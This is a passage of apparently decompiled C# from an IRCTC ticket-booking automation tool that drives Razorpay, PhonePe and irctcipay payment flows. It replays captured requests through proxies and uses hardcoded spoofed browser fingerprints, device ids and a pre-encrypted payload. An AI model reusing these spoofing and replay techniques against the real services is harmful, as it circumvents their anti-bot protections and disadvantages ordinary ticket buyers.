                postdata = "method=upi&vpa=" + HttpUtility.UrlEncode(str) + "&save=0&upi%5Bflow%5D=collect&_%5Bflow%5D=directpay&amount=" + text7 + "&fee=0&currency=INR&order_id=" + text8 + "&key_id=" + text3 + "&_%5Bshield%5D%5Bfhash%5D=5da0ccf56a61a6e81276f615ba61ec44e4220074&_%5Bdevice_id%5D=1.5da0ccf56a61a6e81276f615ba61ec44e4220074.1616035709005.21978214&_%5Bshield%5D%5Btz%5D=330&_%5Bbuild%5D=685528461&notes%5Breservation_id%5D=" + text4 + "&notes%5Bapp_code%5D=BOOKING&notes%5Bpayment_mode%5D=Internet&notes%5Btxn_date%5D=" + text5 + "&notes%5Bsecurity_id%5D=CRIS&notes%5Bamount%5D=" + text6 + "&notes%5Bmerchant_order_id%5D=" + text4 + "&_%5Bcheckout_id%5D=GsThl2GoueZgdX&_%5Blibrary%5D=hosted&_%5Bplatform%5D=browser&_%5Breferer%5D=https%3A%2F%2Fwww.irctc.co.in%2F&_%5Brequest_index%5D=0";
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. " + text + "(4/6)", tCntrlName_, null, null);
                }
                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                int num = 0;
                GetString(response, "payment_id");
                string text12 = GetString(response, "url") + "&callback=Razorpay.jsonp0_";
                text12 = text12.Replace("\\", "");
                if (response.IndexOf("error[code]") > 0)
                {
                    string_91 = "Change Bank Getways";
                    File.AppendAllText(string_42, class3_0.string_39 + "|");
                    return false;
                }
                postdata = "";
                if (string_87.Contains("@axisbank"))
                {
                    frmUPI.payStart = true;
                }
                else if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Click Pay From Mobile APP", tCntrlName_, null, null);
                }
                DateTime dateTime = DateTime.Now.AddSeconds(62.0);
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. " + text + "(5/6)", tCntrlName_, null, null);
                }
                while (true)
                {
                    url = text12 + num;
                    Application.DoEvents();
                    Thread.Sleep(3000);
                    if (DateTime.Now > dateTime)
                    {
                        break;
                    }
                    if (_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        if (!response.Contains("status\":\"created"))
                        {
                            break;
                        }
                        num++;
                        continue;
                    }
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                if (response.Contains("razorpay_signature"))
                {
                    postdata = "";
                    Reffral = url;
                    //url = finalpaymentlink;
                    string text13 = response;
                    text2 = text13.Substring(text13.IndexOf("razorpay_payment_id") + 22);
                    string text14 = text2.Substring(0, text2.IndexOf("\""));
                    text2 = text13.Substring(text13.IndexOf("razorpay_order_id") + 20);
                    string text15 = text2.Substring(0, text2.IndexOf("\""));
                    text2 = text13.Substring(text13.IndexOf("razorpay_signature") + 21);
                    string text16 = text2.Substring(0, text2.IndexOf("\""));
                    postdata = "razorpay_hosted_id=" + text15 + "&razorpay_payment_id=" + text14 + "&razorpay_order_id=" + text15 + "&razorpay_signature=" + text16;
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. " + text + "(6/6)", tCntrlName_, null, null);
                    }
                    if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                    if (response.Contains("https://www.irctc.co.in/eticketing/"))
                    {
                        string_91 = url;
                        string_90 = response;
                        return true;
                    }
                    return result;
                }
                postdata = "";
                Reffral = url;
                url = text11 + "?fail_type=[object%20Object]";
                if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                string_91 = "Change Bank Getways";
                return false;
            }
            catch (Exception ex)
            {
                clsMain.method_74("Process_RazorPay", ex.Message);
                return false;
            }
        }

        internal bool Method_PhonepeQr(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            bool flag = class3_0.LoginType == "WEB";
            string_90 = "";
            string_91 = "";
            string_88 = string_88.ToUpper();
            class3_0.string_72 = "";
            clsMain.Lock("Enter ProcessCC_PhonePe.  DETAILS: ");
            string_86.Contains("PhonePe");
            //string_86 = response;
            response = string_86;
            bool result = false;
            string text = string_88;
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text2 = array[0].Trim();
            string text3 = array[1];
            if (string_88.Contains("_DC") || string_88.Contains("_CC"))
            {
                if (text3.Length < 2)
                {
                    text3 = "0" + text3;
                }
                if (!((text == "HDFC_DC") | text.Contains("HDFC_CC")) && !((text == "SBI_DC") | text.Contains("SBI_CC")) && !text.Contains("AIRTEL_CC"))
                {
                }
            }
            else if (!string_88.Contains("PHONEPE"))
            {
                string text4 = text;
                switch (text4)
                {
                    default:
                        if (!(text4 == "IDBI"))
                        {
                            text4 = "CORP";
                        }
                        break;
                    case "HDFC":
                    case "SBI":
                    case "ICICI":
                    case "UNION":
                        break;
                }
            }
            try
            {
                string text6 = string_86.Substring(string_86.IndexOf("token") + 16);
                string text7 = text6.Substring(0, text6.IndexOf("\""));
                //string text18 = string_86.Substring(string_86.IndexOf("token=") + 6);
                string text14s = "eyJvc2lkIjoiNDc4ZDFlZjQzNmExZjQwYmMwNDkyYjBmYjI4ZDE4OTQxMjA2MWZiMjU3OGZmZDZhMjNmMzViYWYzZWRmZTI0MyIsInhkaHAiOiI3OTlhNTk4ZWU3ZmRhYzVkNjZmZTY1Nzc2M2NlZDE2YThjZmMzZWI0N2I5OWJmYjVjMDNiYTk1ZDgwYzJjMWY4IiwieHdnbCI6IjVlMTA1YWY0NTIwNTU3MGE0ODJhMjM0MjAzYjZiYjAxZmVkOTY3NTMwMzA2ZjNjMGNiMjVmYWRkNWY1ZWJiNzciLCJvbWlkIjoiV2ViIEJyb3dzZXIiLCJ4b3N2IjoiQ2hyb21lIDkyLjAiLCJ4ZHBpIjoiZDU0ZjM0MTU1MTZlZTQzMGE2OTEzNzFlZTNiZjVmMzYyYmRhYzUzODU0YWI0MDZlZTVmYWMwNjBiMzJhZGZkNiJ9";
                if (!flag)
                {
                    string text5 = response.Substring(response.IndexOf("amount") + 9);
                    text5.Substring(0, text5.IndexOf("\""));
                    url = "https://mercury-t2.phonepe.com/transact";
                    postdata = "token=" + text7;
                }
                else
                {
                    postdata = class3_0.Method_SerialInp_pho(string_86, ref url, A_2: false);
                    string[] array2 = postdata.Split(new string[1] { "=" }, StringSplitOptions.RemoveEmptyEntries);
                    text7 = array2[1];
                }
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Phonepe QR Step1", tCntrlName_, null, null);
                }
                bool_24 = true;
                string reffff = url + "?token="+text7;
                if (!_Request(url, postdata, Reffral, webProxy_3, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }

                dateTime_4 = DateTime.Now.AddMilliseconds(-60.0);
                //stopwatch_0.Restart();
                Reffral = "https://www.irctc.co.in/eticketing/protected/mapps1/bookingInitPayment/653a020d";
                url = "https://mercury-t2.phonepe.com/apis/v1/init/composite?t=" + method_14() + "__5";
                postdata = "{}";
                bool_13 = true;
                string_63i = "x-auth-token#" + text7 + "||x-browser-fingerprint#" + text14s + "||x-encrypted#true";
                string_71 = "x-auth-token=" + text7 + "&x-browser-fingerprint=" + text14s + "&x-encrypted=true";
                if (!_Request_Phonepe(url, postdata, Reffral, webProxy_3, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    string_91 = "Change Bank Getways";
                }
                string text8 = text7; //string_29.Substring(string_29.IndexOf("token=") + 6);"{\"vpa\":\"" + text5 + "\"}";
                                      //
                url = "https://mercury-t2.phonepe.com/apis/v1/guest/pay?t=" + method_14();
                string text9s = Class12.smethod_34("{\"qr\":{\"details\":{}}}");
                bool_29 = true;
                postdata = "{\"request\":\"hf+r9cI8oJNYhcbf1sduj+jlMAp65NdQ85pOlRkBK5Kcc3YCTkd2GzrgRKlyIoPc5bM0nppRsm+kF0fK8Osy2hczm9QZnRpIH8F1uIDE+VWeb1dqi/govv84wEacYVaOHxuzhTFYAhiAE9TTr4BpuOwyVxzOx/tlaTUlE4h+aXg9TQjp3twMSs3M328Ir7gBKuN8TyvXi2w9hYEs5yrungxLvgvZphXkQiWgbCmwOZ7ZTB27oktGUCdep3KWIMz/KeWTKzl26/qHr8/6OFGh5W3ZZw8UR0GnkpW4fki8uAtg/4k+HsMEHX/bBH9CjXUOpKOfLxhTOjU6FsB9hL56AO1GbyMhsfCSQKMk3JMOdUrcNWnqv8Gk9OfGkPBvlQWyKBIMdInBxMlLQY96tLntown0PrKOkS3bxT1ST56Tc430+gFs4hcLnOObFwcH3Voz11fVE/GUq4EWy+x2uNNZu/a3dhswf3ZM2GbkDkkbtdbrE8t66aIxazQzKzDx2moJJjfXHDaQg5Q8LJGh1hlSvjnTQZcfY1MBv6LFarPBvkxu26b4gfOeAPT0XdB6fj+/sS8H1dxobDv52TWSmfMF5vR7TGscgnVG6tdUoSAOvhy4pPtpUVwDZTOiCsIalIrtNx35GoZTpZ5pWf0eVjFx3aUZIqOGHQL2XNhwABQeJ5U=\"}";//"{\"Request\":\"" + text9s + "\"}";
                updateTStatus_1.BeginInvoke(1, "Phonepe QR Step2", tCntrlName_, null, null);
                string_71 = "x-auth-token=" + text8 + "&x-browser-fingerprint=eyJvc2lkIjoiYjE2NjU1NDM0M2FiNmQyNzdkZTI3N2NkZDVkNmFjYTg2NjllNDFjMTY5YjE1YjcxM2JlYjk1NWUwZTc4MDI5MCIsInhkaHAiOiI3OTlhNTk4ZWU3ZmRhYzVkNjZmZTY1Nzc2M2NlZDE2YThjZmMzZWI0N2I5OWJmYjVjMDNiYTk1ZDgwYzJjMWY4IiwieHdnbCI6IjJiZTY0NWMyNDZmMzFhOTdkZjUwYWZiYzI2ZTEyYzBhZGUzOTE2YWY3ZTI3YmZiMzVmM2EzOGNhZmE5ODg3NDIiLCJvbWlkIjoiV2ViIEJyb3dzZXIiLCJ4b3N2IjoiQ2hyb21lIDg5LjAiLCJ4ZHBpIjoiZDJkMmIzNDIxY2FlMjVmMTNmYjkwN2JiODc3MDMyNDA1MmE0NjUwMDdiOGMwOWE3ZTBlZmQ3ZWVjYjIzY2RmYyJ9&x-encrypted=true";
                if (!_Request_Phonepe(url, postdata, reffff, webProxy_3, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    string_91 = "Change Bank Getways";
                }
                string qrbase634 = jsonData_Serial(response, "qrData");

                postdata = "";
                FrmQr frmOTPP = new FrmQr();
                frmOTPP.Form1_Load(qrbase634, clsMain.TktName_, class3_0.Txnamt);
                DateTime dateTime = DateTime.Now.AddSeconds(62.0);
                updateTStatus_1.BeginInvoke(1, "Scan & Click Paid!!", tCntrlName_, null, null);
                do
                {
                    url = "https://mercury-t2.phonepe.com/apis/v1/transaction/status?t=" + method_14();
                    Application.DoEvents();
                    Thread.Sleep(1000);
                    //if (DateTime.Now > dateTime)
                    //{
                    //    break;
                    //}
                    bool_29 = true;
                    string_52 = "Tls12";
                    string_71 = "x-auth-token=" + text8 + "&x-browser-fingerprint=eyJvc2lkIjoiMTg3NTgyNjY1MTQwNzVjNjk1NmU5YTEwNzdmYjJiYzBhZWVjYThlNzdjMTE2NzI3MDIxYTZjYjkxMDhiNjY3NCIsInhkaHAiOiI1YmMyOGQ2ZmExNDAwNDI2ZjJmM2M4ZDYzMjM2MzRlYzlmZDgxMTEzMGQxNWEwNDczOTljMzM1MjdhYjk3ODVjIiwieHdnbCI6ImJkNTZkZDEyOTRhYjUwYzljNjUzMTJmYmIxNjYzZjY5MjFmMTVlZTQ5NTM4ZDI4YWExZDE4ZDdlNDE5ZDRjOTMiLCJvbWlkIjoiV2ViIEJyb3dzZXIiLCJ4b3N2IjoiQ2hyb21lIDczLjAiLCJ4ZHBpIjoiZjc1ZThiM2VmMTQwZDI2Y2RhYzkyYTFjZjI4OTE3NjEwZGY5NDk5OGQ2ZTQ3MGUyZjk4N2U4YTI0ZGZlZjhlMyJ9&x-encrypted=false";
                    if (!_Request_Phonepe(url, postdata, Reffral, webProxy_3, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                }
                while (!response.Contains("state\":\"SUCCESS"));
                if (!response.Contains("state\":\"SUCCESS"))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                string text10 = response;
                url = "https://mercury-t2.phonepe.com/apis/v1/irctc/notification?t=" + method_14();
                bool_29 = true;
                updateTStatus_1.BeginInvoke(1, "Payment Sucessfull", tCntrlName_, null, null);
                string_71 = "x-auth-token=" + text8 + "&x-browser-fingerprint=eyJvc2lkIjoiMTg3NTgyNjY1MTQwNzVjNjk1NmU5YTEwNzdmYjJiYzBhZWVjYThlNzdjMTE2NzI3MDIxYTZjYjkxMDhiNjY3NCIsInhkaHAiOiI1YmMyOGQ2ZmExNDAwNDI2ZjJmM2M4ZDYzMjM2MzRlYzlmZDgxMTEzMGQxNWEwNDczOTljMzM1MjdhYjk3ODVjIiwieHdnbCI6ImJkNTZkZDEyOTRhYjUwYzljNjUzMTJmYmIxNjYzZjY5MjFmMTVlZTQ5NTM4ZDI4YWExZDE4ZDdlNDE5ZDRjOTMiLCJvbWlkIjoiV2ViIEJyb3dzZXIiLCJ4b3N2IjoiQ2hyb21lIDczLjAiLCJ4ZHBpIjoiZjc1ZThiM2VmMTQwZDI2Y2RhYzkyYTFjZjI4OTE3NjEwZGY5NDk5OGQ2ZTQ3MGUyZjk4N2U4YTI0ZGZlZjhlMyJ9&x-encrypted=false&debugPayload=" + text10;
                if (!_Request_Phonepe(url, postdata, Reffral, webProxy_3, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                if (response.Contains("https://www.irctc.co.in/eticketing/"))
                {
                    string text11 = response.Substring(response.IndexOf("url") + 6);
                    text11 = text11.Substring(0, text11.IndexOf("\""));
                    string text12 = response.Substring(response.IndexOf("response") + 11);
                    text12 = "response=" + text12.Substring(0, text12.IndexOf("\""));
                    response = method_168(text11, text12);
                    string_91 = url;
                    string_90 = response;
                    return true;
                }
                return result;
            }
            catch (Exception ex)
            {
                clsMain.method_74("Process_PhonePay", ex.Message);
                File.AppendAllText(string_42, class3_0.string_39 + "|");
                return false;
            }
        }

        internal bool method_159(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            bool flag = class3_0.LoginType == "WEB";
            string_90 = "";
            string_91 = "";
            string_88 = string_88.ToUpper();
            class3_0.string_72 = "";
            clsMain.Lock("Enter ProcessCC_PhonePe.  DETAILS: ");
            string_86.Contains("PhonePe");
            //string_86 = response;
            response = string_86;
            bool result = false;
            string text = string_88;
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text2 = array[0].Trim();
            string text3 = array[1];
            if (string_88.Contains("_DC") || string_88.Contains("_CC"))
            {
                if (text3.Length < 2)
                {
                    text3 = "0" + text3;
                }
                if (!((text == "HDFC_DC") | text.Contains("HDFC_CC")) && !((text == "SBI_DC") | text.Contains("SBI_CC")) && !text.Contains("AIRTEL_CC"))
                {
                }
            }
            else if (!string_88.Contains("PHONEPE"))
            {
                string text4 = text;
                switch (text4)
                {
                    default:
                        if (!(text4 == "IDBI"))
                        {
                            text4 = "CORP";
                        }
                        break;
                    case "HDFC":
                    case "SBI":
                    case "ICICI":
                    case "UNION":
                        break;
                }
            }
            try
            {
                string text6 = string_86.Substring(string_86.IndexOf("token") + 16);
                string text7 = text6.Substring(0, text6.IndexOf("\""));
                //string text18 = string_86.Substring(string_86.IndexOf("token=") + 6);
                string text14s = "eyJvc2lkIjoiNDc4ZDFlZjQzNmExZjQwYmMwNDkyYjBmYjI4ZDE4OTQxMjA2MWZiMjU3OGZmZDZhMjNmMzViYWYzZWRmZTI0MyIsInhkaHAiOiI3OTlhNTk4ZWU3ZmRhYzVkNjZmZTY1Nzc2M2NlZDE2YThjZmMzZWI0N2I5OWJmYjVjMDNiYTk1ZDgwYzJjMWY4IiwieHdnbCI6IjVlMTA1YWY0NTIwNTU3MGE0ODJhMjM0MjAzYjZiYjAxZmVkOTY3NTMwMzA2ZjNjMGNiMjVmYWRkNWY1ZWJiNzciLCJvbWlkIjoiV2ViIEJyb3dzZXIiLCJ4b3N2IjoiQ2hyb21lIDkyLjAiLCJ4ZHBpIjoiZDU0ZjM0MTU1MTZlZTQzMGE2OTEzNzFlZTNiZjVmMzYyYmRhYzUzODU0YWI0MDZlZTVmYWMwNjBiMzJhZGZkNiJ9";
                if (!flag)
                {
                    string text5 = response.Substring(response.IndexOf("amount") + 9);
                    text5.Substring(0, text5.IndexOf("\""));
                    url = "https://mercury-t2.phonepe.com/transact";
                    postdata = "token=" + text7;
                }
                else
                {
                    postdata = class3_0.Method_SerialInp_pho(string_86, ref url, A_2: false);
                    string[] array2 = postdata.Split(new string[1] { "=" }, StringSplitOptions.RemoveEmptyEntries);
                    text7 = array2[1];
                }
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. BHIMUPI(1/5)", tCntrlName_, null, null);
                }
                bool_24 = true;
                if (!_Request(url, postdata, Reffral, webProxy_3, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }

                dateTime_4 = DateTime.Now.AddMilliseconds(-60.0);
                //stopwatch_0.Restart();
                Reffral = "https://www.irctc.co.in/eticketing/protected/mapps1/bookingInitPayment/653a020d";
                url = "https://mercury-t2.phonepe.com/apis/v1/init/composite?t=" + method_14() + "__5";
                postdata = "{}";
                bool_13 = true;
                string_63i = "x-auth-token#" + text7 + "||x-browser-fingerprint#" + text14s + "||x-encrypted#true";
                string_71 = "x-auth-token=" + text7 + "&x-browser-fingerprint=" + text14s + "&x-encrypted=true";
                if (!_Request_Phonepe(url, postdata, Reffral, webProxy_3, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    string_91 = "Change Bank Getways";
                }
                string text8 = text7; //string_29.Substring(string_29.IndexOf("token=") + 6);"{\"vpa\":\"" + text5 + "\"}";
                string text9 = Class12.smethod_34("{\"vpa\":\"" + text2 + "\"}");
                do
                {

                    url = "https://mercury-t2.phonepe.com/apis/v1/vpa/validate?t=" + method_14() + "__5";
                    postdata = "{\"request\":\"" + text9 + "\"}";
                    bool_29 = true;
                    string_71 = "x-auth-token=" + text8 + "&x-browser-fingerprint=" + text14s + "&x-encrypted=true";//"x-auth-token=" + text8 + "&x-browser-fingerprint=eyJvc2lkIjoiYjE2NjU1NDM0M2FiNmQyNzdkZTI3N2NkZDVkNmFjYTg2NjllNDFjMTY5YjE1YjcxM2JlYjk1NWUwZTc4MDI5MCIsInhkaHAiOiI3OTlhNTk4ZWU3ZmRhYzVkNjZmZTY1Nzc2M2NlZDE2YThjZmMzZWI0N2I5OWJmYjVjMDNiYTk1ZDgwYzJjMWY4IiwieHdnbCI6IjJiZTY0NWMyNDZmMzFhOTdkZjUwYWZiYzI2ZTEyYzBhZGUzOTE2YWY3ZTI3YmZiMzVmM2EzOGNhZmE5ODg3NDIiLCJvbWlkIjoiV2ViIEJyb3dzZXIiLCJ4b3N2IjoiQ2hyb21lIDg5LjAiLCJ4ZHBpIjoiZDJkMmIzNDIxY2FlMjVmMTNmYjkwN2JiODc3MDMyNDA1MmE0NjUwMDdiOGMwOWE3ZTBlZmQ3ZWVjYjIzY2RmYyJ9&x-encrypted=true&sec-ch-ua=\"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \"; Not A Brand\";v=\"99\"";
                    updateTStatus_1.BeginInvoke(1, "Init. BHIMUPI(2/5)", tCntrlName_, null, null);
                    if (!_Request_Phonepe(url, postdata, Reffral, webProxy_3, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        string_91 = "Change Bank Getways";
                    }
                }
                while (!response.Contains("name"));
                url = "https://mercury-t1.phonepe.com/apis/v1/vpa/pay?t=" + method_14();
                text9 = Class12.smethod_34("{\"external_vpa\":{\"details\":{\"vpa\":\"" + text2 + "\"}}}");
                bool_29 = true;
                postdata = "{\"payRequest\":\"" + text9 + "\"}";
                updateTStatus_1.BeginInvoke(1, "Init. BHIMUPI(3/5)", tCntrlName_, null, null);
                string_71 = "x-auth-token=" + text8 + "&x-browser-fingerprint=eyJvc2lkIjoiYjE2NjU1NDM0M2FiNmQyNzdkZTI3N2NkZDVkNmFjYTg2NjllNDFjMTY5YjE1YjcxM2JlYjk1NWUwZTc4MDI5MCIsInhkaHAiOiI3OTlhNTk4ZWU3ZmRhYzVkNjZmZTY1Nzc2M2NlZDE2YThjZmMzZWI0N2I5OWJmYjVjMDNiYTk1ZDgwYzJjMWY4IiwieHdnbCI6IjJiZTY0NWMyNDZmMzFhOTdkZjUwYWZiYzI2ZTEyYzBhZGUzOTE2YWY3ZTI3YmZiMzVmM2EzOGNhZmE5ODg3NDIiLCJvbWlkIjoiV2ViIEJyb3dzZXIiLCJ4b3N2IjoiQ2hyb21lIDg5LjAiLCJ4ZHBpIjoiZDJkMmIzNDIxY2FlMjVmMTNmYjkwN2JiODc3MDMyNDA1MmE0NjUwMDdiOGMwOWE3ZTBlZmQ3ZWVjYjIzY2RmYyJ9&x-encrypted=true";
                if (!_Request_Phonepe(url, postdata, Reffral, webProxy_3, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    string_91 = "Change Bank Getways";
                }
                postdata = "";
                DateTime dateTime = DateTime.Now.AddSeconds(62.0);
                if (text2.Contains("@axisbank"))
                {
                    while (true)
                    {
                        if (DateTime.Now > dateTime)
                        {
                            updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                            frmUPI.payStart = true;
                            break;
                        }
                        if (frmUPI.payStart)
                        {
                            Application.DoEvents();
                            Thread.Sleep(100);
                            continue;
                        }
                        updateTStatus_1.BeginInvoke(1, "AXIS UPI Pay Start...", tCntrlName_, null, null);
                        frmUPI.payStart = true;
                        break;
                    }
                }
                else
                {
                    updateTStatus_1.BeginInvoke(1, "Accep Upi Request From Mobile", tCntrlName_, null, null);
                }
                
                do
                {
                    url = "https://mercury-t2.phonepe.com/apis/v1/transaction/status?t=" + method_14();
                    Application.DoEvents();
                    Thread.Sleep(1000);
                    if (DateTime.Now > dateTime)
                    {
                        break;
                    }
                    bool_29 = true;
                    string_52 = "Tls12";
                    string_71 = "x-auth-token=" + text8 + "&x-browser-fingerprint=eyJvc2lkIjoiMTg3NTgyNjY1MTQwNzVjNjk1NmU5YTEwNzdmYjJiYzBhZWVjYThlNzdjMTE2NzI3MDIxYTZjYjkxMDhiNjY3NCIsInhkaHAiOiI1YmMyOGQ2ZmExNDAwNDI2ZjJmM2M4ZDYzMjM2MzRlYzlmZDgxMTEzMGQxNWEwNDczOTljMzM1MjdhYjk3ODVjIiwieHdnbCI6ImJkNTZkZDEyOTRhYjUwYzljNjUzMTJmYmIxNjYzZjY5MjFmMTVlZTQ5NTM4ZDI4YWExZDE4ZDdlNDE5ZDRjOTMiLCJvbWlkIjoiV2ViIEJyb3dzZXIiLCJ4b3N2IjoiQ2hyb21lIDczLjAiLCJ4ZHBpIjoiZjc1ZThiM2VmMTQwZDI2Y2RhYzkyYTFjZjI4OTE3NjEwZGY5NDk5OGQ2ZTQ3MGUyZjk4N2U4YTI0ZGZlZjhlMyJ9&x-encrypted=false";
                    if (!_Request_Phonepe(url, postdata, Reffral, webProxy_3, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                }
                while (!response.Contains("state\":\"SUCCESS"));
                if (!response.Contains("state\":\"SUCCESS"))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                string text10 = response;
                url = "https://mercury-t2.phonepe.com/apis/v1/irctc/notification?t=" + method_14();
                bool_29 = true;
                updateTStatus_1.BeginInvoke(1, "Init. BHIMUPI(5/5)", tCntrlName_, null, null);
                string_71 = "x-auth-token=" + text8 + "&x-browser-fingerprint=eyJvc2lkIjoiMTg3NTgyNjY1MTQwNzVjNjk1NmU5YTEwNzdmYjJiYzBhZWVjYThlNzdjMTE2NzI3MDIxYTZjYjkxMDhiNjY3NCIsInhkaHAiOiI1YmMyOGQ2ZmExNDAwNDI2ZjJmM2M4ZDYzMjM2MzRlYzlmZDgxMTEzMGQxNWEwNDczOTljMzM1MjdhYjk3ODVjIiwieHdnbCI6ImJkNTZkZDEyOTRhYjUwYzljNjUzMTJmYmIxNjYzZjY5MjFmMTVlZTQ5NTM4ZDI4YWExZDE4ZDdlNDE5ZDRjOTMiLCJvbWlkIjoiV2ViIEJyb3dzZXIiLCJ4b3N2IjoiQ2hyb21lIDczLjAiLCJ4ZHBpIjoiZjc1ZThiM2VmMTQwZDI2Y2RhYzkyYTFjZjI4OTE3NjEwZGY5NDk5OGQ2ZTQ3MGUyZjk4N2U4YTI0ZGZlZjhlMyJ9&x-encrypted=false&debugPayload=" + text10;
                if (!_Request_Phonepe(url, postdata, Reffral, webProxy_3, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                if (response.Contains("https://www.irctc.co.in/eticketing/"))
                {
                    string text11 = response.Substring(response.IndexOf("url") + 6);
                    text11 = text11.Substring(0, text11.IndexOf("\""));
                    string text12 = response.Substring(response.IndexOf("response") + 11);
                    text12 = "response=" + text12.Substring(0, text12.IndexOf("\""));
                    response = method_168(text11, text12);
                    string_91 = url;
                    string_90 = response;
                    return true;
                }
                return result;
            }
            catch (Exception ex)
            {
                clsMain.method_74("Process_PhonePay", ex.Message);
                File.AppendAllText(string_42, class3_0.string_39 + "|");
                return false;
            }
        }

        internal bool method_160_oto(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            bool flag = class3_0.LoginType == "WEB";
            bool flag2 = false;
            string_90 = "";
            string_91 = "";
            string_88 = string_88.ToUpper();
            class3_0.string_72 = "";
            clsMain.Lock("Enter ProcessCC_RAZ.  DETAILS: ");
            //string_86 = Contains("razorpay");
            response = string_86;
            string text = string_88;
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text2 = array[0].Trim();
            string text3 = array[1];
            string text4 = "";
            string string_92 = "";
            string text5 = "";
            string str = "";
            string string_93 = "";
            string string_94 = "";
            string text6 = "";
            string text7;
            if (string_88.Contains("_DC") || string_88.Contains("_CC"))
            {
                text7 = "DC";
                text4 = array[2];
                string_92 = array[3];
                text5 = array[4];
                str = array[6];
                string_93 = array[7];
                if (text3.Length < 2)
                {
                    text3 = "0" + text3;
                }
                if ((text == "HDFC_DC") | text.Contains("HDFC_CC"))
                {
                    text6 = "21";
                }
                else if ((text == "SBI_DC") | text.Contains("SBI_CC"))
                {
                    text6 = "101";
                }
                else if (text.Contains("AIRTEL_CC"))
                {
                    text6 = "102";
                }
                else if (text.Contains("KOTAK_"))
                {
                    text6 = "KOTAK_DC";
                }
                else if (text.Contains("PAYZAP_"))
                {
                    text6 = "103";
                }
            }
            else if (string_88.Contains("OTOPAY"))
            {
                text7 = "OTOPAY";
                text6 = "109";
            }
            else if (string_88.Contains("IMUDRA"))
            {
                text7 = "Wallet";
                text6 = "113";
            }
            else
            {
                text7 = "NB";
                switch (text)
                {
                    case "HDFC":
                        text6 = "36";
                        break;
                    case "SBI":
                        text6 = "1";
                        break;
                    case "ICICI":
                        text6 = "44";
                        break;
                    case "UNION":
                        text6 = "28";
                        break;
                    case "IDBI":
                        text6 = "52";
                        break;
                    case "CORP":
                        text6 = "56";
                        break;
                }
            }
            if (!flag)
            {
                string text8 = response.Substring(response.IndexOf("amount") + 9);
                text8.Substring(0, text8.IndexOf("\""));
                string text9 = response.Substring(response.IndexOf("encdata") + 18);
                string text10 = text9.Substring(0, text9.IndexOf("\""));
                url = "https://www.irctcipay.com/pgui/jsp/irctcRequestAction";
                postdata = "encdata=" + text10;
            }
            else
            {

                postdata = class3_0.Method_SerialInp(response, ref url, false);
            }
            if (updateTStatus_1 != null)
            {
                updateTStatus_1.BeginInvoke(1, "Init. " + text7 + "(1/2)", tCntrlName_, null, null);
            }
            string_52 = "Tls12";
            bool result;
            if (!_Request(url, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
            {
                clsMain.Lock("Getting payment out error= " + response);
                result = false;
            }
            else
            {
                dateTime_4 = DateTime.Now.AddMilliseconds(-60.0);
                //stopwatch_0.Restart();
                string text11 = method_103(response, "<input type=\"hidden\" id=\"amount\" name=\"amount\" value", "value=", ">");
                Reffral = "https://www.irctcipay.com/pgui/jsp/surchargePaymentPage.jsp";
                if (updateTStatus_1 != null)
                {
